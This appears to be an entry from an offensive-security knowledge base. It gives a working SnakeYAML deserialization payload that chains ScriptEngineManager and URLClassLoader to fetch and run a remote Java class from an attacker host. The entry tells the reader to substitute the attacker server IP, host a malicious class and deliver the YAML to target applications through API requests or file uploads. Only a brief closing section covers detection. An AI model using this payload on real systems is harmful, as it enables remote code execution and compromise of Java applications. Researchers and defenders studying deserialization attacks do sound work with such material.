---
type: code
language: yaml
verified: true
tags:
  - deserialization
  - gadget
  - rce
  - java
platforms:
  - Java
validated: true
---

# SnakeYAML-ScriptEngineManager-Remote-Load-Payload

## Code

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
```

## Description

This YAML payload exploits SnakeYAML's deserialization by instantiating a ScriptEngineManager gadget chained with URLClassLoader. Upon parsing, it loads a remote Java class from the specified URL, enabling arbitrary code execution on the target system. The payload targets vulnerable SnakeYAML configurations that allow unsafe object creation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| attacker-ip | IP address of the attacker's web server hosting the malicious class | 192.168.1.100 |

Replace `attacker-ip` in the code with the actual server IP before use.

## Usage

Embed this payload in a YAML file and deliver it to a target Java application using SnakeYAML for deserialization, such as via API POST requests or file uploads. Ensure a malicious class (e.g., one executing system commands) is hosted at the URL. Used in procedures like [[procedures/Exploit-YAML-Deserialization-with-SnakeYAML]] for RCE.

## Detection

- Monitor YAML inputs for suspicious tags like `!!javax.script.ScriptEngineManager` or `!!java.net.URLClassLoader`.
- Log network outbound connections from deserialization processes to unexpected domains/IPs.
- Enable Java security manager or deserialization filters to block gadget chains; audit SnakeYAML usage for safe modes.
- Detect anomalous class loading via JVM logs or tools like Java Flight Recorder.
